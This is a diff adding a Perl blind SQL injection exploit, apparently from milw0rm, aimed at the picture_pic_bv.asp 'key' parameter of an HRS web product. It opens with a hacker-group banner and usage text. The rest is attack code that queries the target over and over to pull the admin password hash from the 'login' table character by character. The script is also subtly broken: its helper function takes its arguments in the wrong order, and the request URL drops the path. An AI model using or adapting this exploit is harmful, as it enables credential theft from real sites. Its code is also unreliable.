@@ -1,0 +1,104 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+if(!$ARGV[1])
+{
+  print "                                                                \n";
+  print "   #################### Viva IslaMe Viva IslaMe ################\n";
+  print "   #   HRS Multi Blind SQL Injection Exploit                   #\n";
+  print "   #                                 (picture_pic_bv.asp key ) #\n";
+  print "   #   Author: Mr.SQL                                          #\n";
+  print "   #   EMAIL : SQL@HOTMAIL.IT                                  #\n";
+  print "   #                                                           #\n";
+  print "   #                -((:: GrE3E3E3E3E3ETZ ::))-                #\n";
+  print "   #                                                           #\n";
+  print "   #   HaCkEr_EGy :: His0k4 :: Dark MaSTer :: MoHaMaD AL 3rab  #\n";
+  print "   #                :: ALwHeD :: milw0rm ::                    #\n";
+  print "   #                                                           #\n";
+  print "   #              <<>>   MuSliMs HaCkErS   <<>>                #\n";
+  print "   #                                                           #\n";
+  print "   #   PRODUCT SITE: http://www.softacid.net/			#\n";
+  print "   #                                                           #\n";
+  print "   #   HOME:    WwW.PaL-HaCkEr.CoM                             #\n";
+  print "   #                                                           #\n";
+  print "   #   Usage  : perl test.pl host                              #\n";
+  print "   #   Example: perl test.pl www.host.com / -d 10              #\n";
+  print "   #   Options:                                                #\n";
+  print "   #     -d    valid key  value                                #\n";
+  print "   #############################################################\n";
+  exit;
+}
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $userid  = 1;
+my $key     = $ARGV[2];
+my %options = ();
+GetOptions(\%options, "u=i", "p=s", "d=i");
+print "[~] Exploiting...\n";
+if($options{"u"})
+{
+  $userid = $options{"u"};
+}
+if($options{"d"})
+{
+  $key = $options{"d"};
+}
+syswrite(STDOUT, "[~] MD5-Hash: ", 14);
+for(my $i = 1; $i <= 32; $i++)
+{
+  my $f = 0;
+  my $h = 48;
+  while(!$f && $h <= 57)
+  {
+    if(istrue2($host, $path, $userid, $key, $i, $h))
+    {
+      $f = 1;
+      syswrite(STDOUT, chr($h), 1);
+    }
+    $h++;
+  }
+  if(!$f)
+  {
+    $h = 97;
+    while(!$f && $h <= 122)
+    {
+      if(istrue2($host, $path, $userid, $key, $i, $h))
+      {
+        $f = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }
+}
+print "\n[~] Exploiting done\n";
+sub istrue2
+{
+  my $host  = shift;
+  my $key   = shift;
+  my $i     = shift;
+  my $h     = shift;
+ 
+  my $ua = LWP::UserAgent->new;
+  my $query = "http://".$host."picture_pic_bv.asp?key=".$key." and (SUBSTRING((SELECT password FROM login LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
+ 
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+ 
+  my $resp = $ua->get($query);
+  my $content = $resp->content;
+  my $regexp = "tourterms.pdf";
+ 
+  if($content =~ /$regexp/)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+}
+
+# milw0rm.com [2008-07-21]
